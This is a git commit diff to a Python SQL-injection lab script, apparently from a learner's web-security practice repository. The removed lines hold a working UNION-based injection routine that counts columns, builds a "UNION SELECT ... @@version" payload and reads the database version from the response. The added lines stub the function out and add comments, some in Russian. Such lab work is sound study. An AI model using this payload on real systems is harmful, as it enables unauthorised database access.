dfd8a10ed2406e2f4ff4547c9481eabef1c17a4d
madi <madimirzakup@gmail.com>
2025-01-14 20:59:42 +0500

    #

--- Server Side Topics/SQLi/w/payload.py
+++ Server Side Topics/SQLi/w/payload.py
@@ -1,48 +1,24 @@
 import sys
 import logging
-import urllib3
-import requests
-import re
-import utils
-from shop import Shop
+import argparse
+import urllib3 #25 line ->
 
-log = logging.getLogger(__name__)
+import requests
+
+import utils
+log = logging.getLogger(__name__) #Ч : Создаёт логгер с именем текущего модуля (файла).
 logging.basicConfig(
-    stream=sys.stdout,
+    stream=sys.stdout, #Логи выводятся в стандартный вывод (терминал).
     level=logging.INFO,
-    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
-    style="{", 
+    format="{asctime} [{threadName}] [{levelname}][{name}] {message}",
+    style="{",
     datefmt="%H:%M:%S",
 )
-
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) #Removes warnings about insecure HTTPS connections
 
 def main(args):
-    shop = Shop(args.url, args.no_proxy)
-    num_columns = utils.determine_number_of_columns(
-        shop.category_url, shop.no_proxy
-        )
-    if not num_columns:
-        log.error("Couldn't determine number of columns. Exiting")
-        sys.exit(-1)
-    text_columns = utils.determine_text_columns(
-        shop.category_url, shop.no_proxy, num_columns
-    )
-    nulls = ["NULL"] * num_columns
-    nulls[text_columns[0]] = "@@version"
-    nulls_str = ",".join(nulls)
-    exploit = f"' UNION SELECT {nulls_str}-- "
-    resp = shop.get_category(exploit)
-    pattern = re.compile(r'<th>(.*?)</th>')
-    m = pattern.search(resp.text)
-    version = m[1]
-    log.info(f"Database version is: {version}")
-    #print(resp.text)
-    shop.is_solved()
-    
-    
+    pass
+
 if __name__ == "__main__":
-    args=utils.parse_args(sys.argv)
+    args = utils.parse_args(sys.argv)
     main(args)
